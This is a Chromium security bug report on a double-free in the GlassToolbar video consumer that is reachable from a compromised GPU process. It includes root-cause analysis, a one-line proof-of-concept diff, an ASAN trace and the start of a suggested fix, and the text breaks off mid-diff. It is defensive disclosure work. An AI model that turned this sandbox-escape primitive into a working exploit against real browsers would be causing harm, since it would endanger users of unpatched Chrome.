# Double-free in BrowserLiveBackgroundController::VideoConsumer::OnFrameCaptured()

| Field | Value |
|-------|-------|
| **Issue ID** | [503987504](https://issues.chromium.org/issues/503987504) |
| **Status** | Verified |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | UI>Browser |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | al...@gmail.com |
| **Assignee** | em...@google.com |
| **Created** | 2026-04-19 |
| **Bounty** | $2,000.00 |

## Description

Security Bug

Important: Please do not change the component of this bug manually.

Please READ THIS FAQ before filing a bug: <https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md>

Please see the following link for instructions on filing security bugs: <https://www.chromium.org/Home/chromium-security/reporting-security-bugs>

Reports may be eligible for reward payments under the Chrome VRP: <https://g.co/chrome/vrp>

NOTE: Security bugs are normally made public once a fix has been widely deployed.

---

## VULNERABILITY DETAILS

Please provide a brief explanation of the security issue.

### Summary

Double-free in
`BrowserLiveBackgroundController::VideoConsumer::OnFrameCaptured()`
where a heap-allocated `FramePinner` struct is freed twice — once by
Skia's `installPixels` release proc on failure, and again by the caller's
explicit `delete`. The issue manifests in the browser process and is
reachable from the GPU process via the `FrameSinkVideoConsumer` privileged
mojo interface, allowing for a sandbox escape.

Minimal testcase:

```
--- a/components/viz/service/frame_sinks/video_capture/frame_sink_video_capturer_impl.cc
+++ b/components/viz/service/frame_sinks/video_capture/frame_sink_video_capturer_impl.cc
@@ -1541,7 +1541,7 @@
   info->timestamp = frame->timestamp();
   info->metadata = frame->metadata();
-  info->pixel_format = frame->format();
+  info->pixel_format = media::PIXEL_FORMAT_I420;  
   info->coded_size = frame->coded_size();

```
### Analysis

The GlassToolbar feature captures the active tab's rendered output at
30fps and paints a blurred reflection in the toolbar. Frames are delivered
from the GPU process to the browser process via the
[`FrameSinkVideoConsumer`](https://source.chromium.org/chromium/chromium/src/+/main:services/viz/privileged/mojom/compositing/frame_sink_video_capture.mojom;l=56)
mojo interface.

When a frame arrives,
[`VideoConsumer::OnFrameCaptured`](https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/views/toolbar/live_toolbar_background.cc;l=216)
maps the shared memory, allocates a `FramePinner` to pin the mapping
lifetime, and passes it to `SkBitmap::installPixels` as the release
callback context:

```
// live_toolbar_background.cc

namespace {
// ...
struct FramePinner {
  base::ReadOnlySharedMemoryMapping mapping;
  mojo::PendingRemote<viz::mojom::FrameSinkVideoConsumerFrameCallbacks>
      releaser;
};

void ReleaseFrame(void* addr, void* context) {
  delete static_cast<FramePinner*>(context);
}
}  // namespace

// ...

void BrowserLiveBackgroundController::VideoConsumer::OnFrameCaptured(
    media::mojom::VideoBufferHandlePtr data,
    media::mojom::VideoFrameInfoPtr info,
    const gfx::Rect& content_rect,
    mojo::PendingRemote<viz::mojom::FrameSinkVideoConsumerFrameCallbacks>
        callbacks) {
  // ... shared memory mapping and validation (lines 222-238) ...

  void* pixels = const_cast<void*>(mapping.memory());
  gfx::Size bitmap_size(content_rect.right(), content_rect.bottom());
  SkBitmap frame;

  FramePinner* pinner =
      new FramePinner{std::move(mapping), callbacks_remote.Unbind()}; // <--- raw pointer

  bool installed = frame.installPixels(
      SkImageInfo::MakeN32(bitmap_size.width(), bitmap_size.height(),
                           kPremul_SkAlphaType,
                           info->color_space.ToSkColorSpace()),
      pixels,
      media::VideoFrame::RowBytes(media::VideoFrame::Plane::kARGB,
                                  info->pixel_format, info->coded_size.width()),
      &ReleaseFrame, pinner); // <--- release callback

  if (!installed) {
      delete pinner;           // <--- double free
      return;
  }

  frame.setImmutable();
  // ... crop and deliver (lines 263-268) ...
}

```

`installPixels` invokes the release proc on failure before returning `false`:

```
// third_party/skia/src/core/SkBitmap.cpp

static void invoke_release_proc(void (*proc)(void* pixels, void* ctx),
                                void* pixels, void* ctx) {
    if (proc) {
        proc(pixels, ctx);
    }
}

bool SkBitmap::installPixels(const SkImageInfo& requestedInfo, void* pixels,
                             size_t rb,
                             void (*releaseProc)(void* addr, void* context),
                             void* context) {
    if (!this->setInfo(requestedInfo, rb)) {
        invoke_release_proc(releaseProc, pixels, context);   // <--- calls ReleaseFrame
        this->reset();
        return false;                                        // <--- then returns false
    }
    if (nullptr == pixels) {
        invoke_release_proc(releaseProc, pixels, context);
        return true;
    }

    // setInfo may have corrected info (e.g. 565 is always opaque).
    const SkImageInfo& correctedInfo = this->info();
    this->setPixelRef(
            SkMakePixelRefWithProc(correctedInfo.width(), correctedInfo.height(),
                                   rb, pixels, releaseProc, context), 0, 0);
    SkDEBUGCODE(this->validate();)
    return true;
}

```

When `setInfo` fails, Skia calls `invoke_release_proc` which calls
`ReleaseFrame(pinner)` → `delete pinner` (FREE #1), then returns `false`.
The caller checks `!installed` and does `delete pinner` again (FREE #2).

### How installPixels fails

`setInfo` rejects the `SkImageInfo` when `rowBytes` is too small for the
requested pixel width:

```
// third_party/skia/src/core/SkBitmap.cpp

bool SkBitmap::setInfo(const SkImageInfo& info, size_t rowBytes) {
    // ...
    if (kUnknown_SkColorType == info.colorType()) {
        rowBytes = 0;
    } else if (0 == rowBytes) {
        rowBytes = (size_t)mrb;
    } else if (!info.validRowBytes(rowBytes)) {
        return reset_return_false(this);            // <--- rejects here
    }
    // ...
}

// third_party/skia/include/core/SkImageInfo.h

bool SkImageInfo::validRowBytes(size_t rowBytes) const {
    if (rowBytes < this->minRowBytes64()) {         // <--- rowBytes < width * bpp
        return false;
    }
    int shift = this->shiftPerPixel();
    size_t alignedRowBytes = rowBytes >> shift << shift;
    return alignedRowBytes == rowBytes;
}

```

The consumer computes these from two independent mojo parameters with no
cross-validation. From `OnFrameCaptured` above:

```
  // bitmap width derived from content_rect (line 241)
  gfx::Size bitmap_size(content_rect.right(), content_rect.bottom());

  // ...

  // row stride derived from coded_size and pixel_format (lines 252-253)
  bool installed = frame.installPixels(
      SkImageInfo::MakeN32(bitmap_size.width(), bitmap_size.height(), ...),
      pixels,
      media::VideoFrame::RowBytes(media::VideoFrame::Plane::kARGB,
                                  info->pixel_format, info->coded_size.width()),
      &ReleaseFrame, pinner);

```

If `pixel_format` is not ARGB, `RowBytes` returns a smaller stride than
`MakeN32` expects. For example, with `PIXEL_FORMAT_I420`:
`RowBytes` returns `1 * width` (Y plane stride) while `MakeN32` requires
`4 * width` (32-bit ARGB). `setInfo` rejects this via `validRowBytes()`.

`Plane::kARGB` is an alias for `kY = 0`, so `IsValidPlane(I420, 0)`
returns `true`.

### Mojo attack vector

The `FrameSinkVideoConsumer` interface lives in
`services/viz/privileged/mojom/`, accessible to the GPU process.
The GPU process holds the remote end and constructs the `OnFrameCaptured`
message in
[`FrameSinkVideoCapturerImpl::MaybeDeliverFrame`](https://source.chromium.org/chromium/chromium/src/+/main:components/viz/service/frame_sinks/video_capture/frame_sink_video_capturer_impl.cc;l=1487):

```
// frame_sink_video_capturer_impl.cc

void FrameSinkVideoCapturerImpl::MaybeDeliverFrame(FrameCapture frame_capture) {
  // ... frame validation and pixel copy (lines 1488-1540) ...

  media::mojom::VideoFrameInfoPtr info = media::mojom::VideoFrameInfo::New();
  info->timestamp = frame->timestamp();
  info->metadata = frame->metadata();
  info->pixel_format = frame->format();       // <---  attacker controls this
  info->coded_size = frame->coded_size();
  info->visible_rect = frame->visible_rect();
  // ...

  // Send the frame to the consumer.
  consumer_->OnFrameCaptured(std::move(handle), std::move(info),
                             frame_capture.content_rect, std::move(callbacks));
}

```

The browser implements the receiver.

```
GPU/Viz (sandboxed) ──[FrameSinkVideoConsumer (privileged)]──► Browser (unsandboxed)
      ↑                                                            ↑
 capturer                                                     double-free 

```

The testcase is a patch emulating a compromised GPU process which sends
a single mojo message with `pixel_format = I420` while keeping all other
parameters valid. This deterministically triggers the double-free in the
browser process.

The ASAN trace reports `heap-use-after-free` rather than `double-free`
because `FramePinner` has non-trivial members
(`ReadOnlySharedMemoryMapping`, `mojo::PendingRemote`). On the second
`delete`, the destructor reads the mojo pipe handle from already-freed
memory before reaching `operator delete`. ASAN catches this read first.
Windows debugger log of non-asan chrome build crash shows the same picture.

### Security impact

The crash occurs in the browser process, which is unsandboxed on all
desktop platforms. The 72-byte `FramePinner` is allocated with raw `new`
and is not protected by MiraclePtr. The destructor performs mojo pipe
teardown and shared memory unmapping on freed memory, providing strong
exploit primitives beyond a simple double-free.

The `kGlassToolbar` flag is disabled by default but user-activatable via
`chrome://flags#glass-toolbar`, registered `kOsAll`. All desktop platforms
(Windows, macOS, Linux, ChromeOS) are affected.

## VERSION

Chrome Version: 147.0.7727.49 Stable  

Operating System(tested): Linux Ubuntu 22.04.01 x64, Microsoft Windows 11 x64

## REPRODUCTION CASE

1. Apply poc.diff
2. Build chrome with asan
3. Launch chrome with --enable-features=GlassToolbar --no-sandbox

Expectation: instant crash of browser process

FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION
Type of crash: browser
Crash State:

```
=================================================================
==2890247==ERROR: AddressSanitizer: heap-use-after-free on address 0x11c552ab8da8 at pc 0x55557d7c0c0b bp 0x7fffffffbda0 sp 0x7fffffffbd98
READ of size 8 at 0x11c552ab8da8 thread T0 (chrome)
    #0 0x55557d7c0c0a in mojo::internal::PendingRemoteState::~PendingRemoteState() mojo/public/cpp/system/handle.h:169:34
    #1 0x555579dff607 in BrowserLiveBackgroundController::VideoConsumer::OnFrameCaptured(mojo::StructPtr<media::mojom::VideoBufferHandle>, mojo::StructPtr<media::mojom::VideoFrameInfo>, gfx::Rect const&, mojo::PendingRemote<viz::mojom::FrameSinkVideoConsumerFrameCallbacks>) mojo/public/cpp/bindings/pending_remote.h:83:28
    #2 0x555584e286ea in viz::ClientFrameSinkVideoCapturer::OnFrameCaptured(mojo::StructPtr<media::mojom::VideoBufferHandle>, mojo::StructPtr<media::mojom::VideoFrameInfo>, gfx::Rect const&, mojo::PendingRemote<viz::mojom::FrameSinkVideoConsumerFrameCallbacks>) components/viz/host/client_frame_sink_video_capturer.cc:175:14
    #3 0x55556bdf8602 in viz::mojom::FrameSinkVideoConsumerStubDispatch::Accept(viz::mojom::FrameSinkVideoConsumer*, mojo::Message*) gen/services/viz/privileged/mojom/compositing/frame_sink_video_capture.mojom.cc:910:13
    #4 0x55557d743b99 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1085:54
    #5 0x55557d7619d1 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:44:19
    #6 0x55557d74a043 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:747:20
    #7 0x55557d771951 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*) mojo/public/cpp/bindings/lib/multiplex_router.cc:1204:42
    #8 0x55557d76fe3c in mojo::internal::MultiplexRouter::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/multiplex_router.cc:790:7
    #9 0x55557d7619d1 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:44:19
    #10 0x55557d73a72a in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>) mojo/public/cpp/bindings/lib/connector.cc:568:49
    #11 0x55557d73be60 in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:629:14
    #12 0x55557d73b8b9 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int) mojo/public/cpp/bindings/lib/connector.cc:454:3
    #13 0x55557d73d714 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(char const*, unsigned int), base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int) base/functional/bind_internal.h:740:12
    #14 0x55556b4fc66e in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const & base/functional/callback.h:346:12
    #15 0x55556b4fc40a in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&) base/functional/bind_internal.h:673:12
    #16 0x55557e5da1e0 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const & base/functional/callback.h:346:12
    #17 0x55557e5d9b20 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple_watcher.cc:286:14
    #18 0x55557e5dace7 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, base::internal::BindState<true, true, false, void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #19 0x55557d982ee6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #20 0x55557d9fa699 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #21 0x55557d9f950a in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #22 0x55557dba6c08 in base::MessagePumpGlib::HandleDispatch() base/message_loop/message_pump_glib.cc:736:46
    #23 0x55557dbaa1c8 in base::(anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_loop/message_pump_glib.cc:355:43
    #24 0x155555403d3a in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x55d3a) (BuildId: abcc0ea5e864452570bd1eb5a45f3c6a52b5891c)

0x11c552ab8da8 is located 56 bytes inside of 72-byte region [0x11c552ab8d70,0x11c552ab8db8)
freed by thread T0 (chrome) here:
    #0 0x555566384002 in operator delete(void*, unsigned long) (/mnt/data/code/chromium/src/out/experiments_linux/chrome+0x10e30002) (BuildId: b0303e8cbd9e8fec)
    #1 0x555566f26ce9 in SkBitmap::installPixels(SkImageInfo const&, void*, unsigned long, void (*)(void*, void*), void*) third_party/skia/src/core/SkBitmap.cpp:319:9
    #2 0x555579dff4c2 in BrowserLiveBackgroundController::VideoConsumer::OnFrameCaptured(mojo::StructPtr<media::mojom::VideoBufferHandle>, mojo::StructPtr<media::mojom::VideoFrameInfo>, gfx::Rect const&, mojo::PendingRemote<viz::mojom::FrameSinkVideoConsumerFrameCallbacks>) chrome/browser/ui/views/toolbar/live_toolbar_background.cc:247:26
    #3 0x555584e286ea in viz::ClientFrameSinkVideoCapturer::OnFrameCaptured(mojo::StructPtr<media::mojom::VideoBufferHandle>, mojo::StructPtr<media::mojom::VideoFrameInfo>, gfx::Rect const&, mojo::PendingRemote<viz::mojom::FrameSinkVideoConsumerFrameCallbacks>) components/viz/host/client_frame_sink_video_capturer.cc:175:14
    #4 0x55556bdf8602 in viz::mojom::FrameSinkVideoConsumerStubDispatch::Accept(viz::mojom::FrameSinkVideoConsumer*, mojo::Message*) gen/services/viz/privileged/mojom/compositing/frame_sink_video_capture.mojom.cc:910:13
    #5 0x55557d743b99 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1085:54
    #6 0x55557d7619d1 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:44:19
    #7 0x55557d74a043 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:747:20
    #8 0x55557d771951 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*) mojo/public/cpp/bindings/lib/multiplex_router.cc:1204:42
    #9 0x55557d76fe3c in mojo::internal::MultiplexRouter::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/multiplex_router.cc:790:7
    #10 0x55557d7619d1 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:44:19
    #11 0x55557d73a72a in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>) mojo/public/cpp/bindings/lib/connector.cc:568:49
    #12 0x55557d73be60 in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:629:14
    #13 0x55557d73b8b9 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int) mojo/public/cpp/bindings/lib/connector.cc:454:3
    #14 0x55557d73d714 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(char const*, unsigned int), base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int) base/functional/bind_internal.h:740:12
    #15 0x55556b4fc66e in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const & base/functional/callback.h:346:12
    #16 0x55556b4fc40a in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&) base/functional/bind_internal.h:673:12
    #17 0x55557e5da1e0 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const & base/functional/callback.h:346:12
    #18 0x55557e5d9b20 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple_watcher.cc:286:14
    #19 0x55557e5dace7 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, base::internal::BindState<true, true, false, void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #20 0x55557d982ee6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #21 0x55557d9fa699 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #22 0x55557d9f950a in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #23 0x55557dba6c08 in base::MessagePumpGlib::HandleDispatch() base/message_loop/message_pump_glib.cc:736:46
    #24 0x55557dbaa1c8 in base::(anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_loop/message_pump_glib.cc:355:43
    #25 0x155555403d3a in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x55d3a) (BuildId: abcc0ea5e864452570bd1eb5a45f3c6a52b5891c)

previously allocated by thread T0 (chrome) here:
    #0 0x5555663833fd in operator new(unsigned long) (/mnt/data/code/chromium/src/out/experiments_linux/chrome+0x10e2f3fd) (BuildId: b0303e8cbd9e8fec)
    #1 0x555579dff3b6 in BrowserLiveBackgroundController::VideoConsumer::OnFrameCaptured(mojo::StructPtr<media::mojom::VideoBufferHandle>, mojo::StructPtr<media::mojom::VideoFrameInfo>, gfx::Rect const&, mojo::PendingRemote<viz::mojom::FrameSinkVideoConsumerFrameCallbacks>) chrome/browser/ui/views/toolbar/live_toolbar_background.cc:245:7
    #2 0x555584e286ea in viz::ClientFrameSinkVideoCapturer::OnFrameCaptured(mojo::StructPtr<media::mojom::VideoBufferHandle>, mojo::StructPtr<media::mojom::VideoFrameInfo>, gfx::Rect const&, mojo::PendingRemote<viz::mojom::FrameSinkVideoConsumerFrameCallbacks>) components/viz/host/client_frame_sink_video_capturer.cc:175:14
    #3 0x55556bdf8602 in viz::mojom::FrameSinkVideoConsumerStubDispatch::Accept(viz::mojom::FrameSinkVideoConsumer*, mojo::Message*) gen/services/viz/privileged/mojom/compositing/frame_sink_video_capture.mojom.cc:910:13
    #4 0x55557d743b99 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:1085:54
    #5 0x55557d7619d1 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:44:19
    #6 0x55557d74a043 in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*) mojo/public/cpp/bindings/lib/interface_endpoint_client.cc:747:20
    #7 0x55557d771951 in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*) mojo/public/cpp/bindings/lib/multiplex_router.cc:1204:42
    #8 0x55557d76fe3c in mojo::internal::MultiplexRouter::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/multiplex_router.cc:790:7
    #9 0x55557d7619d1 in mojo::MessageDispatcher::Accept(mojo::Message*) mojo/public/cpp/bindings/lib/message_dispatcher.cc:44:19
    #10 0x55557d73a72a in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>) mojo/public/cpp/bindings/lib/connector.cc:568:49
    #11 0x55557d73be60 in mojo::Connector::ReadAllAvailableMessages() mojo/public/cpp/bindings/lib/connector.cc:629:14
    #12 0x55557d73b8b9 in mojo::Connector::OnWatcherHandleReady(char const*, unsigned int) mojo/public/cpp/bindings/lib/connector.cc:454:3
    #13 0x55557d73d714 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::* const&)(char const*, unsigned int), mojo::Connector*, char const* const&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(char const*, unsigned int), base::internal::UnretainedWrapper<mojo::Connector, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, base::internal::UnretainedWrapper<char const, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void (unsigned int)>::Run(base::internal::BindStateBase*, unsigned int) base/functional/bind_internal.h:740:12
    #14 0x55556b4fc66e in base::RepeatingCallback<void (unsigned int)>::Run(unsigned int) const & base/functional/callback.h:346:12
    #15 0x55556b4fc40a in base::internal::Invoker<base::internal::FunctorTraits<void (* const&)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)> const&>, base::internal::BindState<false, true, false, void (*)(base::RepeatingCallback<void (unsigned int)> const&, unsigned int, mojo::HandleSignalsState const&), base::RepeatingCallback<void (unsigned int)>>, void (unsigned int, mojo::HandleSignalsState const&)>::Run(base::internal::BindStateBase*, unsigned int, mojo::HandleSignalsState const&) base/functional/bind_internal.h:673:12
    #16 0x55557e5da1e0 in base::RepeatingCallback<void (unsigned int, mojo::HandleSignalsState const&)>::Run(unsigned int, mojo::HandleSignalsState const&) const & base/functional/callback.h:346:12
    #17 0x55557e5d9b20 in mojo::SimpleWatcher::OnHandleReady(int, unsigned int, mojo::HandleSignalsState const&) mojo/public/cpp/system/simple_watcher.cc:286:14
    #18 0x55557e5dace7 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::SimpleWatcher::*&&)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>&&, int&&, unsigned int&&, mojo::HandleSignalsState&&>, base::internal::BindState<true, true, false, void (mojo::SimpleWatcher::*)(int, unsigned int, mojo::HandleSignalsState const&), base::WeakPtr<mojo::SimpleWatcher>, int, unsigned int, mojo::HandleSignalsState>, void ()>::RunOnce(base::internal::BindStateBase*) base/functional/bind_internal.h:740:12
    #19 0x55557d982ee6 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&) base/functional/callback.h:155:12
    #20 0x55557d9fa699 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*) base/task/common/task_annotator.h:112:5
    #21 0x55557d9f950a in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork() base/task/sequence_manager/thread_controller_with_message_pump_impl.cc:346:40
    #22 0x55557dba6c08 in base::MessagePumpGlib::HandleDispatch() base/message_loop/message_pump_glib.cc:736:46
    #23 0x55557dbaa1c8 in base::(anonymous namespace)::WorkSourceDispatch(_GSource*, int (*)(void*), void*) base/message_loop/message_pump_glib.cc:355:43
    #24 0x155555403d3a in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x55d3a) (BuildId: abcc0ea5e864452570bd1eb5a45f3c6a52b5891c)

SUMMARY: AddressSanitizer: heap-use-after-free mojo/public/cpp/system/handle.h:169:34 in mojo::internal::PendingRemoteState::~PendingRemoteState()
Shadow bytes around the buggy address:
  0x11c552ab8b00: 00 00 00 fa fa fa f7 fa fd fd fd fd fd fd fd fd
  0x11c552ab8b80: fd fa fa fa f7 fa fd fd fd fd fd fd fd fd fd fa
  0x11c552ab8c00: fa fa f7 fa fd fd fd fd fd fd fd fd fd fd fa fa
  0x11c552ab8c80: f7 fa fd fd fd fd fd fd fd fd fd fa fa fa f7 fa
  0x11c552ab8d00: fd fd fd fd fd fd fd fd fd fa fa fa f7 fa fd fd
=>0x11c552ab8d80: fd fd fd fd fd[fd]fd fa fa fa f7 fa 00 00 00 00
  0x11c552ab8e00: 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa
  0x11c552ab8e80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x11c552ab8f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x11c552ab8f80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x11c552ab9000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb

==2890247==ADDITIONAL INFO

==2890247==Note: Please include this section with the ASan report.
Task trace:
    #0 0x55557e5da653 in mojo::SimpleWatcher::Context::Notify(unsigned int, MojoHandleSignalsState, unsigned int) mojo/public/cpp/system/simple_watcher.cc:103:13


Command line: `out/experiments_linux/chrome --enable-features=GlassToolbar --no-sandbox --user-data-dir=/tmp/chrome_poc_test2 --flag-switches-begin --flag-switches-end --ozone-platform=x11 --file-url-path-alias=/gen=/mnt/data/code/chromium/src/out/experiments_linux/gen`


MiraclePtr Status: NOT PROTECTED
No raw_ptr<T> access to this region was detected prior to this crash.
This crash is still exploitable with MiraclePtr.
Refer to https://chromium.googlesource.com/chromium/src/+/main/base/memory/raw_ptr.md for details.

==2890247==END OF ADDITIONAL INFO

==2890247==ABORTING

```
## CREDIT INFORMATION

Externally reported security bugs may appear in Chrome release notes. If this bug is included, how would you like to be credited?  

Reporter credit: Alisa Esage (@alisaesage)

## Attachments

- [asan_browser_crash.log](attachments/asan_browser_crash.log) (text/plain, 19.7 KB)
- [poc.diff](attachments/poc.diff) (text/x-diff, 960 B)
- [windbg.log](attachments/windbg.log) (text/plain, 34.6 KB)

## Timeline

### al...@gmail.com (2026-04-19)

Correction: wrong chrome version, actually tested on 147.0.7727.101 (current Stable)

### al...@gmail.com (2026-04-19)

Commit which introduced the issue: <https://chromium-review.googlesource.com/c/chromium/src/+/7615109>

Suggested fix:

Remove the redundant `delete`. Skia guarantees exactly-once release proc
invocation regardless of success or failure:

```
--- a/chrome/browser/ui/views/toolbar/live_toolbar_background.cc
+++ b/chrome/browser/ui/views/toolbar/live_toolbar_background.cc
@@ -254,7 +254,6 @@
       &ReleaseFrame, pinner);

